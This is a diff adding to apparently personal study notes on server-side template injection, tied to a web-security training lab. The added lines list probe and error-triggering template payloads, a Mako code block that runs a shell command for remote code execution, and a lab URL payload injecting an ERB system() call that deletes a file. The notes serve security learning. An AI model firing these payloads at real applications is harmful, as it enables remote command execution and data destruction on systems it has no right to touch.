@@ -131,6 +131,21 @@ ${7*7}---->a{*comment*}b---->Smart
 ${7*7}---->a{*comment*}b---->${"z".join("ab")}---> Mako OR Unknown
 ${7*7}----->{{7*7}}---->{{7*'7'}}
 
+# If you are lucky the server will be printing the errors and you will be able to find the engine used inside the errors. Some possible payloads that may cause errors:
+
+${}
+{{}}
+<%= %>
+${7/0}
+{{7/0}}
+<%= 7/0 %>
+${foobar}
+{{foobar}}
+<%= foobar %>
+${7*7}
+{{7*7}}
+``
+
 # You should be aware that the same payload can sometimes return a successful response in more than one template language.
 # For example, the payload {{7*'7'}} returns 49 in Twig and 7777777 in Jinja2. 
 # Therefore, it is important not to jump to conclusions based on a single successful response. 
@@ -138,7 +153,35 @@ ${7*7}----->{{7*7}}---->{{7*'7'}}
 
 
 Process 3: Exploit
+
 # After detecting that a potential vulnerability exists and successfully identifying the template engine, you can begin trying to find ways of exploiting it. 
+
+<> Read
+
+# Unless you already know the template engine inside out, reading its documentation is usually the first place to start. 
+# While this may not be the most exciting way to spend your time, it is important not to underestimate what a useful source of information the documentation can be. 
+
+<> Learn the basic template syntax
+
+# Learning the basic syntax is obviously important, along with key functions and handling of variables.
+# Even something as simple as learning how to embed native code blocks in the template can sometimes quickly lead to an exploit.
+# For example, once you know that the Python-based Mako template engine is being used, achieving remote code execution could be as simple as: 
+
+<%
+                import os
+                x=os.popen('id').read()
+                %>
+                ${x}
+                
+#                 
+                
+                
+Lab: Basic server-side template injection
+# This lab is vulnerable to server-side template injection due to the unsafe construction of an ERB template. 
+
+Payload: https://YOUR-LAB-ID.web-security-academy.net/?message=<%25+system("rm+/home/carlos/morale.txt")+%25>
+
+
 
 
 
